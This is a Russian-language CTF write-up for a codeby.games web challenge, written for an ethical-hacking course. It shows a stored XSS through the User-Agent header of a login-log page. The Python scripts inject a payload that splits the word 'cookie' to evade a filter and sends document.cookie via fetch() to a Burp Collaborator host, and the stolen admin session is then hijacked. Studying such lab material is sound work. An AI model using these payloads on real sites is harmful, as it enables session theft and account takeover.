# Врайт-ап задания "Запретный код" с платформы codeby.games

![Untitled](content/Untitled.png)

Задание **“Запретный код”** имеет сложность “Сложный” и относится к категории Веб

---

Переходим по указанному адресу **(62.173.140.174:16035)** и видим страницу авторизации с возможностью создания аккаунта

![Untitled](content/Untitled%201.png)

После регистрации попадаем на страницу с логами входа. При регистрации аккаунта я сразу решил попробовать проэксплуатировать XSS уязвимость и в поле *Username* вставил тестовый скрипт `<script>alert(1)</alert>`
Страница после входа выглядит так:

![Untitled](content/Untitled%202.png)

---

Попробуем зайти в наш аккаунт с другого профиля в хром но с другим паролем, чтобы попытка входа отобразилась в логах

![Untitled](content/Untitled%203.png)

![Untitled](content/Untitled%204.png)

Видим, что наш скрипт успешно отработал

---

Теперь же наша задача попасть в админ панель, посмотрим, из чего состоят cookie, чтобы мы могли по ним попасть к админу

![Untitled]content/Untitled%205.png)

---

Напишем простой скрипт на питоне с использованием библиотеки requests для того чтобы посмотреть возможность редактирования User agent. Это все нам надо чтобы в последствии когда мы допишем пейлоад мы могли в наш User agent запихнуть пейлоад на получения куков админа

```python
# Импорт библиотеки requests для работы с http запросами
import requests
# Сам пейлоад
payload = '<script>alert(document.cookie);</script>'

# Логин который будет использоваться при входе
user = "asdf"
# Часть из запроса включаящая User-agent которую мы изменяем на payload
headers = {'User-Agent': payload}
# Тоже часть запроса, передающая данные для входа
data = {"username":user, "password":"aboba"}

# Склеивание запроса вместе и отправка на сервер
response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)

# Вывод статус кода и текста ответа
print(response.status_code)
print(response.text)
```

> Этот скрипт совершает попытку входа в наш аккаунт подставляя в User agent простой пейлоад
> 

Это будет работать примерно так:

- Мы изменяем наш User agent на пейлоад
- Мы знаем, что у админа логин - admin, используем это и будет входить с любым паролем, чтобы у админа он отобразился в логах
- Т.к. мы выяснили, что скрипт вставленный в User agent срабатывает автоматически, следоватаельно мы можем заменить простой пейлоад на пейлоад с получением куки из document.cookie
- Мы будем использовать **Collaborator** из burp suit pro ****для создания временного сервера для приятия наших отстуков

Т.к. на сайте присутствует защита от прямого получения cookie по фильтру на это слово используем возможности JavaScript для преобразования двух частей слово в одно

```jsx
<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>
```

Итоговый пейлоад будет выглядеть так:

```python
import requests
# В данном коде все аналогично прошлому, но тут мы разделили слово cookie на два фрагмента и склеили их потом
payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{ссылка из burpsuit}/?${vv}=` + document[vv]; fetch(payload);</script>'
user = "admin"
headers = {'User-Agent': payload}
data = {"username": user, "password": "aboba"}
response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)
print(response.status_code)
print(response.text)
```

Запускаем и ждем  ответа в бурпе

![Untitled]content/Untitled%206.png)

Тут нас интересует phpsessid, копируем его и подменяем через cookie editor 

![Untitled]content/Untitled%207.png)

И попадаем в админ панель с флагом в ней!

![Untitled](content/Untitled%208.png)

---

Написано [frechez](https://t.me/peeepaw) для курса "Этичный хакинг"
